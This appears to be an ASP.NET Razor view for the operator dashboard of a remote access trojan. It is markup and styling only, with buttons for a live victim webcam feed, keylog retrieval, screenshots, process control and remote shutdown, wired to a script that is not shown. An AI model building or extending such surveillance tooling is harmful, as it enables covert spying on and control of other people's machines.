@{
    ViewData["Title"] = "RAT Dashboard - Pro Terminal";
}

<style>
    /* --- 1. GLOBAL SETTINGS --- */
    body {
        background-color: #0d0d0d;
        color: #c0c0c0;
        font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    }

    /* --- 2. LAYOUT --- */
    .dashboard-layout {
        display: flex;
        height: 85vh;
        gap: 15px;
        padding-top: 10px;
    }

    .left-panel {
        flex: 3.5;
        display: flex;
        flex-direction: column;
        gap: 10px;
    }

    .right-panel {
        flex: 8.5;
        display: flex;
        flex-direction: column;
        gap: 10px;
    }

    /* --- 3. COMPONENTS --- */
    .log-console {
        flex-grow: 1;
        background-color: #000;
        color: #0f0;
        border: 1px solid #333;
        font-family: 'Consolas', monospace;
        font-size: 0.85rem;
        resize: none;
        padding: 10px;
        box-shadow: inset 0 0 10px #000;
    }

        .log-console:focus {
            outline: none;
            border-color: #0f0;
        }

    .cam-screen {
        flex-grow: 1;
        background-color: #050505;
        border: 1px solid #333;
        position: relative;
        overflow: hidden;
        display: flex;
        justify-content: center;
        align-items: center;
    }

    .form-control, .form-select {
        background-color: #1a1a1a !important;
        color: #fff !important;
        border: 1px solid #444 !important;
        border-radius: 2px;
    }

        .form-control:focus, .form-select:focus {
            background-color: #222 !important;
            border-color: #666 !important;
            box-shadow: none;
        }

    /* --- 4. BUTTONS STYLE (GHOST STYLE) --- */
    .btn-pro {
        height: 40px;
        font-weight: 600;
        text-transform: uppercase;
        font-size: 0.8rem;
        letter-spacing: 1px;
        background-color: transparent;
        transition: all 0.3s ease;
        border-radius: 2px;
        width: 100%;
    }

    .btn-cyan {
        border: 1px solid #00bcd4;
        color: #00bcd4;
    }

        .btn-cyan:hover {
            background-color: #00bcd4;
            color: #000;
            box-shadow: 0 0 10px #00bcd4;
        }

    .btn-green {
        border: 1px solid #00e676;
        color: #00e676;
    }

        .btn-green:hover {
            background-color: #00e676;
            color: #000;
            box-shadow: 0 0 10px #00e676;
        }

    .btn-red {
        border: 1px solid #ff1744;
        color: #ff1744;
    }

        .btn-red:hover {
            background-color: #ff1744;
            color: #fff;
            box-shadow: 0 0 10px #ff1744;
        }

    .btn-orange {
        border: 1px solid #ff9100;
        color: #ff9100;
    }

        .btn-orange:hover {
            background-color: #ff9100;
            color: #000;
            box-shadow: 0 0 10px #ff9100;
        }

    .btn-grey {
        border: 1px solid #9e9e9e;
        color: #9e9e9e;
    }

        .btn-grey:hover {
            background-color: #9e9e9e;
            color: #000;
        }

    .control-box {
        border: 1px solid #333;
        background-color: #111;
        padding: 10px;
    }
</style>

<div class="container-fluid">
    <div class="row my-2">
        <div class="col-12">
            <select id="target-select" class="form-select text-center fw-bold" style="border-color: #333;">
                <option value="">-- WAITING FOR CONNECTION --</option>
            </select>
        </div>
    </div>

    <div class="dashboard-layout">

        <div class="left-panel">
            <textarea id="log-output" class="log-console" placeholder="root@system:~# _" readonly></textarea>

            <div class="control-box">
                <div class="row g-2">
                    <div class="col-12">
                        <input type="text" id="pid" class="form-control text-center" placeholder="Nhập tên App hoặc PID...">
                    </div>
                    <div class="col-6">
                        <button onclick="sendAppCommand('START')" class="btn btn-pro btn-green">START</button>
                    </div>
                    <div class="col-6">
                        <button onclick="sendAppCommand('STOP')" class="btn btn-pro btn-red">STOP</button>
                    </div>
                </div>
            </div>
        </div>

        <div class="right-panel">
            <div class="cam-screen">
                <img id="webcam-feed" style="width: 100%; height: 100%; object-fit: fill; display: none;" />
                <div id="camStatus" class="text-center text-secondary">
                    <h4 class="fw-bold" style="letter-spacing: 2px;">NO SIGNAL</h4>
                </div>
            </div>

            <div class="row g-2">
                <div class="col-3">
                    <button onclick="sendCommand('WEBCAM_ON')" class="btn btn-pro btn-red">LIVE CAM</button>
                </div>
                <div class="col-3">
                    <button onclick="stopWebcamUI()" class="btn btn-pro btn-grey">STOP CAM</button>
                </div>
                <div class="col-3">
                    <button onclick="confirmPower('SHUTDOWN')" class="btn btn-pro btn-red">SHUTDOWN</button>
                </div>
                <div class="col-3">
                    <button onclick="confirmPower('RESTART')" class="btn btn-pro btn-orange">RESTART</button>
                </div>
            </div>

            <div class="row g-2">
                <div class="col-4">
                    <button onclick="sendCommand('LIST')" class="btn btn-pro btn-cyan">TASK LIST</button>
                </div>
                <div class="col-4">
                    <button onclick="sendCommand('KEYLOG')" class="btn btn-pro btn-orange">GET KEYLOG</button>
                </div>
                <div class="col-4">
                    <button onclick="sendCommand('SCREENSHOT')" class="btn btn-pro btn-cyan">SCREENSHOT</button>
                </div>
            </div>
        </div>
    </div>
</div>

@section Scripts {
    <script src="~/lib/signalr/signalr.min.js"></script>
    <script src="~/js/controller.js"></script>
}